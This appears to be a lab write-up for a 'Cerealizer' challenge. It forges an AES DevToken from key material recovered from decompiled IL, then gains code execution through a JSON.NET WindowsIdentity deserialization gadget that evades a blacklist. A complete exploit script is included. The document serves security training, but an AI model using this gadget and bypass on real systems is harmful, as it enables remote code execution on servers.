# Cerealizer — JSON.NET Deserialization + DevToken Reverse Engineering

Two parts: reverse-engineer an AES-encrypted DevToken, then exploit JSON.NET TypeNameHandling deserialization with a WindowsIdentity gadget.

---

## Part 1: Reverse Engineering the DevToken

### Context

The app has a `/dev` endpoint that accepts a `DevToken` header. The token is AES-CBC encrypted. Without the right token, the endpoint rejects you. But the app source (or the compiled IL) contains the key material — you just have to find it.

### Finding the Key in IL

Decompile the app (ILSpy, dnSpy, or dotPeek). Look for the DevToken validation code. It'll have something like:

```csharp
private static byte[] V0 = new byte[] { 0x2B, 0x3D, 0x3B, ... };
private static byte[] V2 = new byte[] { 0x24, 0x23, 0x24, ... };
private static byte[] V4 = new byte[] { 0x7F, 0x63, 0x75, ... };
```

These static byte arrays are XOR'd with a fixed byte to produce the key, IV, and expected plaintext. The XOR constant is usually in `<PrivateImplementationDetails>` or right next to the arrays.

### Recovering Key, IV, and Expected Token

```python
# From the IL dump:
V0 = bytes([0x2B,0x3D,0x3B,0x2D,0x2A,0x31,0x2C,0x21,0x76,0x3E,0x37,0x2A,0x76,0x36,0x37,0x2F])
V2 = bytes([0x24,0x23,0x24,0x39,0x24,0x2C,0x21,0x24,0x37,0x28,0x29,0x63,0x23,0x28,0x35,0x39])
V4 = bytes([0x7F,0x63,0x75,0x4C,0x44,0x04,0x54,0x45,0x04,0x63,0x68,0x53,0x04,0x41,0x04,0x7B,
            0x07,0x47,0x04,0x65,0x68,0x43,0x07,0x5C,0x52,0x59,0x4A])

# XOR constants (found in the decompiled code)
key       = bytes([b ^ 0x58 for b in V0])   # "security.for.now"
iv        = bytes([b ^ 0x4D for b in V2])   # "initialized.next"
plaintext = bytes([b ^ 0x37 for b in V4])   # "HTB{s3cr3T_d3v3L0p3R_t0ken}" or similar
```

To generate a valid token, you encrypt the expected plaintext with the recovered key and IV:

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import base64

key = b"security.for.now"   # 16 bytes
iv  = b"initialized.next"   # 16 bytes
# The expected plaintext from the IL — what the app checks against
expected = b"HTB{s3cr3T_d3v3L0p3R_t0ken}"   # replace with actual recovered string

cipher = AES.new(key, AES.MODE_CBC, iv)
dev_token = base64.b64encode(cipher.encrypt(pad(expected, 16))).decode()
print(f"DevToken: {dev_token}")
```

Use this token in the `DevToken` header to access `/dev`.

---

## Part 2: JSON.NET TypeNameHandling Deserialization (WindowsIdentity Gadget)

### Context

The `/dev` endpoint (once authenticated with the DevToken) accepts a JSON body that is deserialized with `TypeNameHandling.Auto` or `TypeNameHandling.All`. This means the JSON can contain a `$type` field that tells the deserializer which .NET type to instantiate — including dangerous ones.

### The Blacklist

The app has a blacklist that rejects JSON containing `"system.diagnostics.process"` (lowercase). So the obvious `Process.Start` gadget is blocked. The trick is to use a gadget that doesn't contain blocked strings in readable form.

### The WindowsIdentity Gadget

`System.Security.Principal.WindowsIdentity` has a field `System.Security.ClaimsIdentity.actor` that is stored as a Base64-encoded BinaryFormatter blob. When JSON.NET deserializes a WindowsIdentity object, it decodes and deserializes this field using BinaryFormatter — which gives us code execution via the TypeConfuseDelegate chain.

The deserialized blob is opaque Base64, so it doesn't trigger the "system.diagnostics.process" string check.

### Generating the Payload

**Step 1:** Generate a BinaryFormatter TypeConfuseDelegate payload (the command to execute):

```bash
# Using ysoserial.net:
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter \
  -c "powershell -enc BASE64_CMD" \
  -o base64
```

**Step 2:** Embed it in the WindowsIdentity JSON gadget:

```json
{
  "$type": "System.Security.Principal.WindowsIdentity, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
  "System.Security.ClaimsIdentity.actor": "BASE64_BINARYFORMATTER_PAYLOAD_HERE"
}
```

**Step 3:** Send to the `/dev` endpoint:

```bash
curl -s -X POST http://TARGET/dev \
  -H "Content-Type: application/json" \
  -H "DevToken: YOUR_DEVTOKEN" \
  -d '{"$type":"System.Security.Principal.WindowsIdentity, mscorlib...","System.Security.ClaimsIdentity.actor":"BASE64_PAYLOAD"}'
```

### Reading the Flag

Use a PowerShell command that writes the flag to the webroot:

```powershell
# In the command payload:
powershell -c "Get-Content C:\Users\Public\flag.txt | Out-File C:\inetpub\wwwroot\out.txt"
```

Then `GET http://TARGET/out.txt`.

---

## Full Exploit Script

```python
#!/usr/bin/env python3
import requests
import base64
import subprocess
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

TARGET = "http://TARGET"

# ---- Step 1: Generate DevToken ----
V0 = bytes([0x2B,0x3D,0x3B,0x2D,0x2A,0x31,0x2C,0x21,0x76,0x3E,0x37,0x2A,0x76,0x36,0x37,0x2F])
V2 = bytes([0x24,0x23,0x24,0x39,0x24,0x2C,0x21,0x24,0x37,0x28,0x29,0x63,0x23,0x28,0x35,0x39])
V4 = bytes([0x7F,0x63,0x75,0x4C,0x44,0x04,0x54,0x45,0x04,0x63,0x68,0x53,0x04,0x41,0x04,0x7B,
            0x07,0x47,0x04,0x65,0x68,0x43,0x07,0x5C,0x52,0x59,0x4A])

key       = bytes([b ^ 0x58 for b in V0])
iv        = bytes([b ^ 0x4D for b in V2])
plaintext = bytes([b ^ 0x37 for b in V4])

cipher = AES.new(key, AES.MODE_CBC, iv)
dev_token = base64.b64encode(cipher.encrypt(pad(plaintext, 16))).decode()
print(f"[*] DevToken: {dev_token}")

# ---- Step 2: Login ----
s = requests.Session()
s.post(f"{TARGET}/login", data={"username": "htb-stdnt", "password": "Academy_student!"})

# ---- Step 3: Generate BinaryFormatter payload ----
# Command: write flag to webroot
cmd_b64 = base64.b64encode(
    'powershell -c "Get-Content C:\\Users\\Public\\flag.txt | Out-File C:\\inetpub\\wwwroot\\out.txt"'
    .encode('utf-16-le')
).decode()

# Run ysoserial to get BF payload
result = subprocess.run(
    ["ysoserial.exe", "-g", "TypeConfuseDelegate", "-f", "BinaryFormatter",
     "-c", f"powershell -enc {cmd_b64}", "-o", "base64"],
    capture_output=True, text=True
)
bf_payload = result.stdout.strip()
print(f"[*] BF payload (first 50): {bf_payload[:50]}...")

# ---- Step 4: Send WindowsIdentity gadget ----
gadget = {
    "$type": "System.Security.Principal.WindowsIdentity, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
    "System.Security.ClaimsIdentity.actor": bf_payload
}

r = s.post(f"{TARGET}/dev",
           json=gadget,
           headers={"DevToken": dev_token})
print(f"[*] Response: {r.status_code} {r.text[:200]}")

# ---- Step 5: Read flag ----
import time; time.sleep(2)
r = s.get(f"{TARGET}/out.txt")
print(f"[+] Flag: {r.text}")
```

---

## Troubleshooting

- **"Invalid DevToken"** — The key or IV XOR constant is wrong. Re-examine the IL more carefully. Look for XOR operations near the byte arrays.
- **"Forbidden" or blacklist triggered** — The JSON contains a blocked string. Switch to the WindowsIdentity gadget instead of direct Process gadgets.
- **200 response but no command execution** — The BinaryFormatter gadget is wrong. Verify ysoserial is generating for the right CLR version and the right formatter.
- **Command executes but file not written** — Path issues. Try `C:\Windows\Temp\` first to verify execution, then move to webroot.
